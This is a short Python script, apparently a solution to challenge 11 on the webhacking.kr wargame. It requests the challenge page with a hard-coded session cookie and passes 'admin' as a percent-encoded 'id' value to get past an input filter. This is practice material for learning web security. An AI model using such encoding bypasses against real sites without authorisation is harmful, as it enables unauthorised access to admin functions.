import requests

url = 'http://webhacking.kr/challenge/web/web-11/'

cookies = {
	'PHPSESSID': '52555efb9f252faad30f403a255c7fde'
}

payloads = {
	'id': '%61%64%6D%69%6E'
}

res = requests.get(url, cookies=cookies, params=payloads)
print(res.text)